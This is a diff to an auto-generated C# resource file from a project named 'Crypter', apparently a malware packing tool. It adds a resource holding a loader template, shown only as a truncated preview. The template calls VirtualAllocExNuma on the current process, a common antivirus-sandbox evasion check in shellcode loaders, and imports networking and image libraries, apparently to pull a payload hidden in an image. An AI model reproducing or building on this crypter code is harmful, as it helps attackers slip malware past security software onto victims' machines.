@@ -238,6 +238,32 @@ namespace Crypter.Properties {
         }
         
         /// <summary>
+        ///   查找类似 using System;
+        ///using System.Drawing;
+        ///using System.Net;
+        ///using System.Runtime.InteropServices;
+        ///using System.Text;
+        ///
+        ///namespace imgc
+        ///{
+        ///    class Program
+        ///    {
+        ///        [DllImport(&quot;kernel32.dll&quot;)]
+        ///        private static extern int VirtualAllocExNuma(IntPtr hProcess, int lpAddress, int dwSize, int flAllocationType, int flProtect, int nndPreferred);
+        ///
+        ///        static void Main(string[] args)
+        ///        {
+        ///           
+        ///            object mem = null;
+        ///            mem = VirtualAllocExNuma(System.Diagnostics.Process.GetCurrentPr [字符串的其余部分被截断]&quot;; 的本地化字符串。
+        /// </summary>
+        internal static string imgcrypt {
+            get {
+                return ResourceManager.GetString("imgcrypt", resourceCulture);
+            }
+        }
+        
+        /// <summary>
         ///   查找 System.Byte[] 类型的本地化资源。
         /// </summary>
         internal static byte[] Include {
